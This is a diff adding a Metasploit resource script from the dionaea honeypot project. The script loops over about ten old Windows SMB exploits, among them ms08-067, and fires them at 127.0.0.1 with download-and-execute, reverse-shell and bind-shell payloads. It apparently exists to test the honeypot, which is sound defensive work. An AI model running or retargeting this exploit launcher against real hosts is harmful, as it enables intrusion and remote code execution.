@@ -1,0 +1,189 @@
+# This file is part of the dionaea honeypot
+#
+# SPDX-FileCopyrightText: 2010 Markus Koetter
+#
+# SPDX-License-Identifier: GPL-2.0-or-later
+
+version
+
+<ruby>
+	sleep(1)
+
+	shellcodes = {
+		'download:exec' => {
+			'payload' => 'windows/download_exec',
+			'options' => {
+					'URL' => 'http://foobar.de/test.exe'
+			}
+		},
+		'shell:reverse' => {
+			'payload' => 'windows/shell/reverse_tcp',
+			'options' => {
+					'LHOST' => '127.0.0.1',
+					'LPORT' => 4445
+			}
+		},
+
+		'shell:bind' => {
+			'payload' => 'windows/shell/bind_tcp',
+			'options' => {
+					'LPORT' => 4444
+			}
+		},
+
+		'exec' => {
+			'payload' => 'windows/exec',
+			'options' => {
+					'CMD' => 'echo foo'
+			}
+		}
+
+	}
+
+	exploits = {
+		'ms03-049' => {
+			'exploit' => 'exploit/windows/smb/ms03_049_netapi',
+			'shellcode' => {
+				'allow' => ['download:exec']
+			}
+		},
+
+		'ms04-007' => {
+			'exploit' => 'exploit/windows/smb/ms04_007_killbill',
+			'shellcode' => {
+				'allow' => ['download:exec']
+			}
+		},
+
+		'ms04-011' => {
+			'exploit' => 'exploit/windows/smb/ms04_011_lsass',
+			'shellcode' => {
+				'allow' => ['download:exec']
+			}
+		},
+
+		'ms04-031' => {
+			'exploit' => 'exploit/windows/smb/ms04_031_netdde',
+			'shellcode' => {
+				'allow' => ['download:exec']
+			}
+		},
+
+		'ms05-039' => {
+			'exploit' => 'exploit/windows/smb/ms05_039_pnp',
+			'shellcode' => {
+				'allow' => ['download:exec']
+			}
+		},
+
+#		'ms06-025' => {
+#			'exploit' => ['exploit/windows/smb/ms06_025_rasmans_reg','exploit/windows/smb/ms06_025_rasmans_rras']
+#		},
+
+		'ms06-040' => {
+			'exploit' => 'exploit/windows/smb/ms06_040_netapi',
+			'shellcode' => {
+				'allow' => ['download:exec']
+			}
+		},
+
+#		'ms06-066' => {
+#			'exploit' => ['exploit/windows/smb/ms06_066_nwapi','exploit/windows/smb/ms06_066_nwwks'],
+#		},
+
+		'ms06-070' => {
+			'exploit' => 'exploit/windows/smb/ms06_070_wkssvc',
+			'shellcode' => {
+				'allow' => ['download:exec']
+			}
+		},
+
+		'ms07-029' => {
+			'exploit' => 'exploit/windows/smb/ms07_029_msdns_zonename',
+			'shellcode' => {
+				'allow' => ['download:exec']
+			}
+		},
+
+		'ms08-067' => {
+			'exploit' => 'exploit/windows/smb/ms08_067_netapi',
+			'shellcode' => {
+				'allow' => ['download:exec']
+			}
+		},
+
+		'ms09-050' => {
+			'exploit' => 'exploit/windows/smb/ms09_050_smb2_negotiate_func_index',
+			'options' => {
+				'WAIT' => 2
+			},
+			'shellcode' => {
+				'allow' => ['download:exec']
+			}
+		},
+
+		'ms10-061' => {
+			'exploit' => 'exploit/windows/smb/ms10_061_spoolss',
+			'options' => {
+				'PNAME' => 'XPSPrinter'
+			}
+		}
+	}
+
+	while (true)
+		exploits.each { |xpk, xpv|
+
+			print_status("Running #{xpk}")
+			run_single("use #{xpv['exploit']}")
+			run_single("set RHOST 127.0.0.1")
+
+			if xpv.has_key?('options') then
+				options = xpv['options']
+				options.each { |key,value|
+					run_single("set #{key} #{value}")
+				}
+			end
+
+			isallowed = true
+			if xpv.has_key?('shellcode') then
+				isallowed = false
+				allow = xpv['shellcode']['allow']
+			else
+				allow = []
+			end
+
+			shellcodes.each { |sck, scv|
+				allowed = isallowed
+				allow.each { |a|
+					if sck.match(/#{a}/) then
+						allowed = true
+						if xpv['shellcode'].has_key?('deny') then
+							deny = xpv['shellcode']['deny']
+							deny.each { |d|
+#								print_status("deny #{sck} #{d}")
+								if sck.match(/#{d}/) then
+									allowed = false
+									break
+								end
+							}
+						end
+						break
+					end
+				}
+				if not allowed then
+					next
+				end
+
+				run_single("set PAYLOAD #{scv['payload']}")
+				options = scv['options']
+				options.each { |key,value|
+					run_single("set #{key} #{value}")
+				}
+				sleep(1)
+				print_status("Exploit #{xpk} Payload #{scv['payload']}")
+				run_single("exploit")
+			}
+		}
+
+	end
+</ruby>
